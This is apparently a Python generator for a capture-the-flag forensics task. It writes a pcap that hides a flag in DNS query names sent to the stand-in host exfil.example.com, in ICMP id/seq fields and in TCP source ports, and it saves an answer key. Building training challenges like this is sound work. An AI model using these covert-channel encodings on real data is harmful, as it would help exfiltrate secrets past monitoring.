#!/usr/bin/env python3
# gen.py — T7: covert channel pcap. Флаг передан тремя каналами одновременно
# (устойчивость к «частичному» решению и три подсказки в одном дампе):
#   Канал A (основной): DNS-запросы к поддоменам: hex-чанк флага в QNAME.
#   Канал B: ICMP seq/id = 2 байта флага за пакет (id=первый, seq=второй).
#   Канал C: TCP source port = байт флага (пакеты SYN к разным хостам).
# Пакеты флага замешаны в шум: 300 DNS/HTTP/ICMP от «обычных» клиентов.
import os, sys, random, binascii
from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, ICMP, TCP, Ether, Raw, wrpcap

def main(outdir, variant, flag):
    random.seed(5000 + variant)
    fb = flag.encode()
    packets = []
    ts = 1731400000.0

    # ===== Канал A: DNS exfiltration (QNAME = chunk-порядок.hex) =====
    # флаг бьётся на 8-байтные чанки, каждый чанк — hex в поддомене:
    # c<idx>.<hex>.exfil.example.com
    for i in range(0, len(fb), 8):
        chunk = fb[i:i+8]
        qname = f"c{i//8}.{chunk.hex()}.exfil.example.com"
        packets.append(IP(src="10.66.13.37", dst="8.8.8.8")/
                       UDP(sport=random.randrange(40000, 60000), dport=53)/
                       DNS(rd=1, qd=DNSQR(qname=qname)))

    # ===== Шум A': 250 обычных DNS =====
    sites = ["google.com", "yandex.ru", "vk.com", "youtube.com", "github.com",
             "wikipedia.org", "stackoverflow.com", "mail.ru", "tinkoff.ru", "habr.com"]
    for i in range(250):
        q = random.choice(sites)
        src = f"192.168.1.{random.randrange(2, 250)}"
        packets.append(IP(src=src, dst="8.8.8.8")/
                       UDP(sport=random.randrange(40000, 60000), dport=53)/
                       DNS(rd=1, qd=DNSQR(qname=q)))
        packets.append(IP(src="8.8.8.8", dst=src)/
                       UDP(sport=53, dport=random.randrange(40000, 60000))/
                       DNS(qr=1, ra=1, qd=DNSQR(qname=q),
                           an=DNSRR(rrname=q, ttl=300, rdata=f"93.184.{random.randrange(0,255)}.{random.randrange(0,255)}")))

    # ===== Канал B: ICMP id/seq =====
    # каждый ICMP echo несёт 2 байта: id = индекс-старший|байт? Упрощаем: id = idx<<8|byte0, seq=byte1
    for i in range(0, len(fb), 2):
        b0 = fb[i]
        b1 = fb[i+1] if i+1 < len(fb) else 0
        idx = i // 2
        icmp_id = (idx << 8) | b0
        if icmp_id == 0: icmp_id = 0x100  # id=0 бывает валиден, но избегаем
        packets.append(IP(src="10.66.13.37", dst="1.1.1.1")/
                       ICMP(type=8, code=0, id=icmp_id, seq=b1))

    # ===== Шум B': 120 обычных ICMP =====
    for i in range(120):
        src = f"192.168.1.{random.randrange(2, 250)}"
        dst = random.choice(["8.8.8.8", "1.1.1.1", "77.88.8.8"])
        packets.append(IP(src=src, dst=dst)/
                       ICMP(type=8, code=0, id=random.randrange(1, 65535), seq=i))

    # ===== Канал C: TCP sport =====
    # SYN-пакеты к 443, sport = байт флага << 8 | idx  (sport > 1024 гарантирован)
    for i, b in enumerate(fb):
        sport = (b << 8) | (i & 0xFF)
        if sport < 1024: sport += 1024
        packets.append(IP(src="10.66.13.37", dst=f"203.0.113.{random.randrange(2, 250)}")/
                       TCP(sport=sport, dport=443, flags="S"))

    # ===== Шум C': 200 SYN к 443 =====
    for i in range(200):
        src = f"192.168.1.{random.randrange(2, 250)}"
        packets.append(IP(src=src, dst=f"203.0.113.{random.randrange(2, 250)}")/
                       TCP(sport=random.randrange(1024, 65535), dport=443, flags="S"))

    # метки времени: в пределах "пары минут"
    random.shuffle(packets)
    t = ts
    for pkt in packets:
        pkt.time = t
        t += random.uniform(0.001, 0.05)

    os.makedirs(outdir, exist_ok=True)
    wrpcap(f"{outdir}/capture.pcap", packets)

    # ===== самопроверка: reassembled через scapy =====
    from scapy.all import rdpcap
    pkts = rdpcap(f"{outdir}/capture.pcap")
    # канал A
    chunks = {}
    for p in pkts:
        if p.haslayer(DNS) and p[DNS].qr == 0 and p.haslayer(DNSQR):
            qn = p[DNSQR].qname.decode()
            if qn.endswith("exfil.example.com."):
                parts = qn.split(".")
                chunks[int(parts[0][1:])] = bytes.fromhex(parts[1])
    flagA = b"".join(chunks[k] for k in sorted(chunks)).decode()
    assert flagA == flag, f"канал A: {flagA!r}"
    # канал B: id = idx<<8|byte0, seq = byte1
    dataB = {}
    for p in pkts:
        if p.haslayer(ICMP) and p[ICMP].type == 8 and p[IP].src == "10.66.13.37":
            dataB[p[ICMP].id >> 8] = bytes([p[ICMP].id & 0xFF, p[ICMP].seq & 0xFF])
    flagB = b"".join(dataB[k] for k in sorted(dataB)).decode().rstrip("\x00")
    assert flagB == flag, f"канал B: {flagB!r}"
    print("B:", flagB)
    print("A:", flagA)
    # канал C: сортировка по позиции в потоке — порядок пакетов перемешан, но
    # idx зашит в младшем байте sport
    dataC = {}
    for p in pkts:
        if p.haslayer(TCP) and p[IP].src == "10.66.13.37" and p[TCP].flags == "S":
            sport = p[TCP].sport
            idx = sport & 0xFF
            dataC[idx] = (sport >> 8) & 0xFF
    flagC = bytes(dataC[k] for k in sorted(dataC)).decode()
    assert flagC == flag, f"канал C: {flagC!r}"
    print("C:", flagC)
    with open(f"{outdir}/.key.json", "w") as f:
        import json
        json.dump({"flag": flag}, f)
    print(f"variant {variant}: OK, {len(packets)} packets")

if __name__ == "__main__":
    outdir, variant, flag = sys.argv[1], int(sys.argv[2]), sys.argv[3]
    main(outdir, variant, flag)
